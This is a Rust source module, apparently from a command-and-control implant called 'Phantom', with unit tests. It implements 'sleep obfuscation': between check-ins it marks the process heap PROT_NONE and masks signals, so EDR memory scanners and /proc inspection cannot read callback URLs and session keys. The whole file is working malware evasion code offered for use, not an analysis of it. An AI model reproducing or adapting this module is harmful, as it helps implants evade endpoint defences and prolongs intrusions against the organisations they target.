//! Sleep obfuscation via `mprotect` — marks heap pages `PROT_NONE` during sleep.
//!
//! During the sleep window between C2 check-ins an implant's heap contains
//! plaintext config data (callback URLs, session keys, etc.) that an EDR memory
//! scanner can trivially read.  This module provides an obfuscated sleep that
//! marks anonymous heap-backed pages `PROT_NONE` for the duration of the sleep,
//! making their contents unreadable to external scanners and kernel-assisted
//! inspection tools such as `ptrace` / `/proc/<pid>/mem`.
//!
//! # Safety requirements
//!
//! `mprotect(PROT_NONE)` on heap pages must only happen while no other thread is
//! accessing heap-allocated data.  This is safe for Phantom's single-checkin
//! loop because Tokio worker threads are blocked on `epoll` (no pending futures)
//! during the sleep interval between callbacks.  Any inflight network I/O that
//! wakes a worker thread during the sleep window could fault; this is accepted as
//! a known limitation and will be addressed by a future userfaultfd-based
//! technique (see tracking issue).
//!
//! All storage used between the `mprotect(PROT_NONE)` and `mprotect` restore
//! calls is stack-allocated — no heap access occurs in that window.

use std::time::Duration;

use tracing::debug;

/// Maximum number of memory regions tracked for a single obfuscation cycle.
const MAX_REGIONS: usize = 128;

/// Stack-allocated buffer size for reading `/proc/self/maps`.
/// 64 KiB is sufficient for a simple agent process; larger maps are truncated
/// (extra regions are silently skipped).
const MAPS_BUF_SIZE: usize = 65_536;

// ---------------------------------------------------------------------------
// Public types
// ---------------------------------------------------------------------------

/// Sleep obfuscation technique used between C2 check-ins.
#[derive(Debug, Clone, Copy, PartialEq, Eq, Default)]
pub enum SleepMode {
    /// Plain sleep with no memory obfuscation.
    ///
    /// Equivalent to the original `tokio::time::sleep` behaviour.  Use this
    /// when mprotect is unavailable (e.g., under `seccomp` policies that deny
    /// `mprotect`) or for debugging.
    Plain,

    /// Mark anonymous heap pages `PROT_NONE` during sleep and restore on wakeup.
    ///
    /// This is the default technique and requires no additional privileges.
    #[default]
    Mprotect,
}

impl SleepMode {
    /// Parse a [`SleepMode`] from its canonical string representation.
    ///
    /// Returns `None` if `s` is not a recognised mode name.
    pub fn parse(s: &str) -> Option<Self> {
        match s {
            "plain" => Some(Self::Plain),
            "mprotect" => Some(Self::Mprotect),
            _ => None,
        }
    }

    /// Return the canonical lowercase string for this mode.
    pub fn as_str(self) -> &'static str {
        match self {
            Self::Plain => "plain",
            Self::Mprotect => "mprotect",
        }
    }
}

// ---------------------------------------------------------------------------
// Public entry point
// ---------------------------------------------------------------------------

/// Sleep for `duration` using the selected obfuscation technique.
///
/// This function **blocks the calling thread**.  Call it from an async context
/// via [`tokio::task::block_in_place`] so the Tokio executor can continue
/// scheduling other tasks on sibling threads.
///
/// For [`SleepMode::Plain`] this delegates to `libc::nanosleep`.
/// For [`SleepMode::Mprotect`] anonymous heap pages are protected before
/// sleeping and restored afterwards.
pub fn blocking_sleep(duration: Duration, mode: SleepMode) {
    let secs = duration.as_secs() as libc::time_t;
    let nsecs = duration.subsec_nanos() as libc::c_long;
    match mode {
        SleepMode::Plain => nanosleep(secs, nsecs),
        SleepMode::Mprotect => mprotect_sleep(secs, nsecs),
    }
}

// ---------------------------------------------------------------------------
// Implementation — mprotect technique
// ---------------------------------------------------------------------------

/// Run one obfuscated sleep cycle.
///
/// The caller supplies pre-converted `secs` / `nsecs` to avoid any heap
/// allocation inside the protected window.
fn mprotect_sleep(secs: libc::time_t, nsecs: libc::c_long) {
    // Collect target regions using only stack storage BEFORE calling mprotect.
    let mut regions = [(0usize, 0usize); MAX_REGIONS];
    let count = collect_heap_regions(&mut regions);

    // Block all deliverable signals for this thread while heap pages are
    // inaccessible.  Signal handlers (including those injected by test
    // harnesses and process monitors) may touch heap-allocated data; a
    // delivery during the PROT_NONE window would SIGSEGV.
    let mut old_sigset: libc::sigset_t = unsafe { std::mem::zeroed() };
    let mut full_sigset: libc::sigset_t = unsafe { std::mem::zeroed() };
    unsafe {
        libc::sigfillset(&mut full_sigset);
        libc::pthread_sigmask(libc::SIG_BLOCK, &full_sigset, &mut old_sigset);
    }

    // -----------------------------------------------------------------------
    // NO heap allocation or deallocation between here and the restore below.
    // All data lives in `regions` (stack) and `secs`/`nsecs` (registers/stack).
    // Signals are masked — no handler can fault on protected pages.
    // -----------------------------------------------------------------------

    // Mark pages inaccessible.
    protect_regions(&regions[..count], libc::PROT_NONE);

    // Sleep via raw syscall — touches only the stack and register file.
    nanosleep(secs, nsecs);

    // Restore all regions (safe even for those whose protect call failed).
    protect_regions(&regions[..count], libc::PROT_READ | libc::PROT_WRITE);

    // -----------------------------------------------------------------------
    // Heap is accessible again — restore signal mask, logging is safe.
    // -----------------------------------------------------------------------
    unsafe {
        libc::pthread_sigmask(libc::SIG_SETMASK, &old_sigset, std::ptr::null_mut());
    }

    debug!(regions = count, "mprotect sleep cycle complete");
}

/// Apply `mprotect(prot)` to each `(start, end)` region.
///
/// Failures are silently ignored: a region that could not be protected is
/// simply left accessible, and an extra `mprotect(PROT_READ|PROT_WRITE)` on an
/// already-accessible page during restore is a no-op.
fn protect_regions(regions: &[(usize, usize)], prot: libc::c_int) {
    for &(start, end) in regions {
        let len = end.wrapping_sub(start);
        if len == 0 {
            continue;
        }
        // SAFETY: Addresses come from `/proc/self/maps` — they are valid mapped
        // pages owned by this process.  Lengths are page-aligned by the kernel.
        unsafe {
            libc::mprotect(start as *mut libc::c_void, len, prot);
        }
    }
}

// ---------------------------------------------------------------------------
// /proc/self/maps parsing — stack-only, no heap
// ---------------------------------------------------------------------------

/// Read `/proc/self/maps` entries into `out` and return the entry count.
///
/// Uses a 64 KiB stack buffer; maps larger than that are truncated and the
/// extra regions are silently ignored.
fn collect_heap_regions(out: &mut [(usize, usize); MAX_REGIONS]) -> usize {
    let mut buf = [0u8; MAPS_BUF_SIZE];
    let n = read_proc_maps(&mut buf);
    if n == 0 {
        return 0;
    }
    parse_maps(&buf[..n], out)
}

/// Read `/proc/self/maps` into `buf` via raw syscalls.
///
/// Returns the number of bytes read, or `0` on error.
fn read_proc_maps(buf: &mut [u8]) -> usize {
    const PATH: &[u8] = b"/proc/self/maps\0";
    // SAFETY: PATH is NUL-terminated; O_RDONLY does not modify any state.
    let fd = unsafe { libc::open(PATH.as_ptr() as *const libc::c_char, libc::O_RDONLY) };
    if fd < 0 {
        return 0;
    }
    // SAFETY: buf is valid writable memory of the stated length.
    let n = unsafe { libc::read(fd, buf.as_mut_ptr() as *mut libc::c_void, buf.len()) };
    // SAFETY: fd is a valid open file descriptor.
    unsafe { libc::close(fd) };
    if n <= 0 { 0 } else { n as usize }
}

/// Parse a `/proc/self/maps` byte slice into `(start, end)` pairs.
///
/// Only private, readable, writable, non-executable anonymous regions (those
/// tagged `[heap]` or with no pathname) are included.  Stack regions, shared
/// mappings, and file-backed mappings are excluded.
///
/// Returns the number of entries written to `out`.
fn parse_maps(data: &[u8], out: &mut [(usize, usize); MAX_REGIONS]) -> usize {
    let mut count = 0;

    for line in data.split(|&b| b == b'\n') {
        if line.is_empty() || count >= MAX_REGIONS {
            continue;
        }

        // Each line: "addr_start-addr_end perms offset dev ino[ pathname]\n"
        // We split into at most 6 fields; the 6th captures everything after
        // the inode (leading spaces + optional pathname).
        let mut fields = line.splitn(6, |&b| b == b' ');

        let addr_field = match fields.next() {
            Some(f) if !f.is_empty() => f,
            _ => continue,
        };
        let perm_field = match fields.next() {
            Some(f) => f,
            None => continue,
        };
        // Skip offset, dev, ino fields.
        let _ = fields.next();
        let _ = fields.next();
        let _ = fields.next();
        // The 6th field is the rest of the line after the 5th space.  After
        // trimming ASCII whitespace from the left we get the pathname (or empty
        // for anonymous pages).
        let name = fields.next().map(|f| f.trim_ascii_start()).unwrap_or(b"");

        // Only `rw-p` (private, read-write, non-exec) regions.
        if perm_field.len() < 4
            || perm_field[0] != b'r'
            || perm_field[1] != b'w'
            || perm_field[2] != b'-'
            || perm_field[3] != b'p'
        {
            continue;
        }

        // Only target the explicit `[heap]` region (the brk-based allocator
        // heap).  Anonymous pages are excluded because in Linux kernels ≥ 4.5
        // thread stacks are no longer labeled `[stack:N]` — they appear as
        // plain anonymous r/w mappings, indistinguishable from allocator arenas.
        // Protecting those would mprotect live thread stacks and cause SIGSEGV.
        if name != b"[heap]" {
            continue;
        }

        // Parse "start-end" hex addresses.
        let dash = match addr_field.iter().position(|&b| b == b'-') {
            Some(i) => i,
            None => continue,
        };
        let start = parse_hex(&addr_field[..dash]);
        let end = parse_hex(&addr_field[dash + 1..]);
        if end <= start {
            continue;
        }

        out[count] = (start, end);
        count += 1;
    }

    count
}

/// Parse an ASCII-hex byte string into a `usize`.
///
/// Returns `0` on the first invalid character.
fn parse_hex(s: &[u8]) -> usize {
    let mut v = 0usize;
    for &b in s {
        let digit = match b {
            b'0'..=b'9' => (b - b'0') as usize,
            b'a'..=b'f' => (b - b'a' + 10) as usize,
            b'A'..=b'F' => (b - b'A' + 10) as usize,
            _ => return 0,
        };
        v = v.wrapping_mul(16).wrapping_add(digit);
    }
    v
}

// ---------------------------------------------------------------------------
// Shared sleep primitive
// ---------------------------------------------------------------------------

/// Sleep via `nanosleep(2)` — pure syscall, no heap access.
fn nanosleep(secs: libc::time_t, nsecs: libc::c_long) {
    let req = libc::timespec { tv_sec: secs, tv_nsec: nsecs };
    let mut rem = libc::timespec { tv_sec: 0, tv_nsec: 0 };
    // SAFETY: both timespec values are valid stack-allocated structs.
    unsafe { libc::nanosleep(&req, &mut rem) };
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

#[cfg(test)]
mod tests {
    use super::*;

    // --- parse_hex ---

    #[test]
    fn parse_hex_lowercase() {
        assert_eq!(parse_hex(b"7f1234abcdef"), 0x7f1234abcdef_usize);
    }

    #[test]
    fn parse_hex_uppercase() {
        assert_eq!(parse_hex(b"FF"), 255);
    }

    #[test]
    fn parse_hex_zero() {
        assert_eq!(parse_hex(b"0"), 0);
    }

    #[test]
    fn parse_hex_invalid_char_returns_zero() {
        assert_eq!(parse_hex(b"zz"), 0);
        assert_eq!(parse_hex(b""), 0);
        assert_eq!(parse_hex(b"0x10"), 0); // 'x' is invalid
    }

    // --- parse_maps ---

    const SAMPLE_MAPS: &[u8] = b"\
7f0010000000-7f0010200000 rw-p 00000000 00:00 0        [heap]\n\
7f0020000000-7f0020100000 rw-p 00000000 00:00 0        \n\
7f0030000000-7f0030100000 r--p 00000000 fd:01 1234     /usr/lib/libfoo.so\n\
7f0040000000-7f0040100000 rw-s 00000000 fd:01 5678     /tmp/shmem\n\
7f0050000000-7f0050100000 rwxp 00000000 00:00 0        \n\
7f0060000000-7f0060100000 rw-p 00000000 00:00 0        [stack]\n\
7f0070000000-7f0070100000 rw-p 00000000 00:00 0        [stack:1234]\n\
";

    #[test]
    fn parse_maps_includes_only_heap() {
        let mut out = [(0usize, 0usize); MAX_REGIONS];
        let n = parse_maps(SAMPLE_MAPS, &mut out);
        // Only the [heap] region; anonymous pages are excluded to avoid
        // mprotecting thread stacks (see module-level safety note).
        assert_eq!(n, 1, "expected only [heap] region");
        assert_eq!(out[0], (0x7f0010000000, 0x7f0010200000));
    }

    #[test]
    fn parse_maps_excludes_anonymous_rw() {
        // Anonymous rw-p pages are excluded because they may be thread stacks.
        let input = b"7f0020000000-7f0020100000 rw-p 00000000 00:00 0 \n";
        let mut out = [(0usize, 0usize); MAX_REGIONS];
        let n = parse_maps(input, &mut out);
        assert_eq!(n, 0);
    }

    #[test]
    fn parse_maps_excludes_exec_pages() {
        let input = b"7f0050000000-7f0050100000 rwxp 00000000 00:00 0 \n";
        let mut out = [(0usize, 0usize); MAX_REGIONS];
        let n = parse_maps(input, &mut out);
        assert_eq!(n, 0);
    }

    #[test]
    fn parse_maps_excludes_shared_mappings() {
        let input = b"7f0040000000-7f0040100000 rw-s 00000000 fd:01 5678 /tmp/shmem\n";
        let mut out = [(0usize, 0usize); MAX_REGIONS];
        let n = parse_maps(input, &mut out);
        assert_eq!(n, 0);
    }

    #[test]
    fn parse_maps_excludes_stack() {
        let input = b"7f0060000000-7f0060100000 rw-p 00000000 00:00 0 [stack]\n";
        let mut out = [(0usize, 0usize); MAX_REGIONS];
        let n = parse_maps(input, &mut out);
        assert_eq!(n, 0);
    }

    #[test]
    fn parse_maps_handles_empty_input() {
        let mut out = [(0usize, 0usize); MAX_REGIONS];
        let n = parse_maps(b"", &mut out);
        assert_eq!(n, 0);
    }

    #[test]
    fn parse_maps_caps_at_max_regions() {
        // Build a maps blob with MAX_REGIONS + 5 valid heap entries.
        let mut input = Vec::new();
        for i in 0..(MAX_REGIONS + 5) {
            let base: u64 = 0x7f0000000000 + (i as u64) * 0x0001_0000;
            let top = base + 0x1000;
            input.extend_from_slice(
                format!("{base:012x}-{top:012x} rw-p 00000000 00:00 0 [heap]\n").as_bytes(),
            );
        }
        let mut out = [(0usize, 0usize); MAX_REGIONS];
        let n = parse_maps(&input, &mut out);
        assert_eq!(n, MAX_REGIONS);
    }

    // --- SleepMode ---

    #[test]
    fn sleep_mode_round_trip() {
        assert_eq!(SleepMode::parse("plain"), Some(SleepMode::Plain));
        assert_eq!(SleepMode::parse("mprotect"), Some(SleepMode::Mprotect));
        assert_eq!(SleepMode::parse("bogus"), None);
        assert_eq!(SleepMode::Plain.as_str(), "plain");
        assert_eq!(SleepMode::Mprotect.as_str(), "mprotect");
    }

    #[test]
    fn sleep_mode_default_is_mprotect() {
        assert_eq!(SleepMode::default(), SleepMode::Mprotect);
    }

    // --- blocking_sleep smoke tests ---

    #[test]
    fn plain_sleep_zero_duration() {
        // Must not panic or hang.
        blocking_sleep(Duration::ZERO, SleepMode::Plain);
    }

    #[test]
    fn mprotect_sleep_completes() {
        // The Rust test harness runs each test in a spawned thread while the
        // main harness thread stays alive.  That harness thread may access
        // heap-allocated data at any time, so calling mprotect(PROT_NONE) on
        // the `[heap]` region from a test thread races with it and can
        // SIGSEGV.
        //
        // We isolate the mprotect cycle in a fork'd child process.  After
        // fork the child is single-threaded (POSIX guarantee), so no other
        // thread can touch the heap during the protection window.
        //
        // SAFETY: We only call async-signal-safe functions (mprotect,
        // nanosleep, _exit, open, read, close) in the child.
        let pid = unsafe { libc::fork() };
        assert!(pid >= 0, "fork() failed");

        if pid == 0 {
            // --- child (single-threaded) ---
            let before: Vec<u8> = vec![0xAA; 16];
            blocking_sleep(Duration::from_millis(1), SleepMode::Mprotect);
            // If the heap was not restored this access would SIGSEGV.
            if before[0] != 0xAA {
                unsafe { libc::_exit(1) };
            }
            unsafe { libc::_exit(0) };
        }

        // --- parent: wait for child ---
        let mut status: libc::c_int = 0;
        unsafe { libc::waitpid(pid, &mut status, 0) };
        assert!(
            libc::WIFEXITED(status) && libc::WEXITSTATUS(status) == 0,
            "child exited abnormally (status={status:#x}); mprotect sleep cycle likely faulted",
        );
    }
}
